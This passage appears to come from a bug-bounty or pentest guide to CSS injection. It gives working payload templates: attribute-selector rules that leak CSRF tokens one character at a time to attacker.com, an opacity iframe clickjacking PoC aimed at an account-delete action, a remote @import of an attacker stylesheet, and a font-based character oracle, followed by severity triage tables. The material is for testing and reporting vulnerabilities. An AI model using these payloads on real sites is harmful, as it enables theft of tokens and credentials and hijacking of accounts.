## 22. CSS INJECTION
> CSS can exfil data and hijack clicks **without executing JavaScript**. Because CSP targets script execution — not stylesheet rules — CSS injection often survives on sites with strict CSP, making it a high-value residual attack surface. Two primitives combined: (1) attribute selectors match DOM by content, (2) properties like `background: url()` and `@import` fire HTTP requests when matched.

### Where this appears
| Context | Example targets |
|---|---|
| User-customizable CSS / themes | Tumblr, Medium custom CSS, Slack themes, Notion embeds, phpBB themes |
| HTML email rendering | Gmail, Outlook, Mailchimp (real CVEs across all three) |
| Forum / CMS rich text | WordPress posts, Confluence custom CSS, MediaWiki user CSS |
| HTML-to-PDF pipelines | Headless Chrome rendering invoices/reports (CSS runs server-side) |
| Server-side template injection side-effect | SSTI rendered into `<style>` block; user-controlled `style` attributes |
| Markdown engines | Some allow `<style>` or `style=` attributes by default |

### Attribute Selector Exfiltration — Core Attack
Steal a CSRF token / API key / password reset token one character at a time. **Works with no JavaScript, survives strict CSP.**

```css
/* Round 1 — leak first character of token */
input[name="csrf"][value^="a"] { background: url(//attacker.com/?c=a) }
input[name="csrf"][value^="b"] { background: url(//attacker.com/?c=b) }
input[name="csrf"][value^="c"] { background: url(//attacker.com/?c=c) }
/* ... 62 rules covering [a-zA-Z0-9] ... */
```

**Mechanics:**
1. Victim loads page containing `<input value="abc123def456">`
2. Browser evaluates all 62 rules — **only one matches** (`value^="a"`)
3. That match triggers `background: url(...)` → browser fires `GET //attacker.com/?c=a`
4. Attacker's server log: "first character = `a`"
5. Round 2: attacker rewrites CSS with `value^="aa"`, `value^="ab"`, ..., `value^="az"` — leaks second character
6. Token of length N is fully extracted in N rounds (or via more advanced single-pass `:has()` + sibling-selector tricks on modern Chrome)

**Single-character variants:**
- `[value^="X"]` — prefix
- `[value$="X"]` — suffix (useful for keystroke logging on `<input>`s)
- `[value*="X"]` — substring (less precise but works for short alphabets)

### Opacity Clickjacking — Concrete PoC for the "chain" requirement
Plugin's conditionally-valid table requires "clickjacking + sensitive action + working PoC" — here's the working PoC template:

```html
<!-- Hosted on attacker.com -->
<button style="position:absolute;top:50px;left:50px;z-index:1;">Click to win iPhone!</button>
<iframe src="https://target.com/account/delete?confirm=1"
        style="position:absolute;top:50px;left:50px;
               width:200px;height:50px;
               opacity:0;z-index:9999;"></iframe>
```

The transparent iframe sits *over* the visible button. Victim sees "win iPhone" and clicks — actually clicks the delete-account confirm button on target.com under their logged-in session. Adjust `top/left/width/height` to overlay the exact sensitive control (transfer button, change-email submit, OAuth consent "Approve").

**Verification checklist for the PoC:**
- [ ] X-Frame-Options not set OR set to `ALLOWALL`
- [ ] CSP `frame-ancestors` not set OR includes wildcard / attacker domain
- [ ] Target action requires only a click (no second confirmation)
- [ ] Logged-in cookies are `SameSite=None` or omitted → cross-site iframe still authenticated

### `@import` — Attacker-Controlled Stylesheet
If a sanitizer strips `<script>` but allows `@import` or `url()` in user CSS, the attacker pulls in an arbitrary remote stylesheet:

```css
@import url(https://attacker.com/evil.css);
```

Now attacker controls **all** styling on the page: overlay phishing forms, hide warning banners, reposition cancel/confirm buttons, etc.

### Font-Based Character Oracle (rare but real)
Use `unicode-range` in `@font-face` to detect whether a specific Unicode character is present, triggering a download only if so. Each fired font request = "this character is present." Useful for leaking short data (PINs, OTP digits visible in the DOM).

```css
@font-face { font-family: x; src: url(//attacker.com/?d=5);
             unicode-range: U+0035; }  /* fires only if "5" rendered on page */
```

### Chains That Pay
```
Attribute selector + CSRF token form  -> token exfil -> CSRF on sensitive action  High
Attribute selector + input[type=password] (rendered)  -> credential exfil partial  High
Opacity clickjacking + transfer/delete/email-change   -> account compromise        Medium/High
@import + phishing form overlay                       -> credential theft          High
Font side-channel + short rendered data (PIN/OTP)     -> character oracle          Low–Medium (chain)
CSS injection with no exfil/overlay path              -> N/A standalone
```

### Triage
```
Attribute selector exfils real sensitive data (token/password/SSN)     = High
@import or full stylesheet control + working phishing PoC              = High
Opacity overlay + completes a sensitive action in PoC                  = Medium/High
Only cosmetic CSS allowed (no url()/@import) + no exfil path           = N/A
url() blocked but transforms/positioning allowed                       = Info (clickjacking-only chain)
HTML email CSS rendering with rendered attacker styles                 = Medium (case-by-case)
```

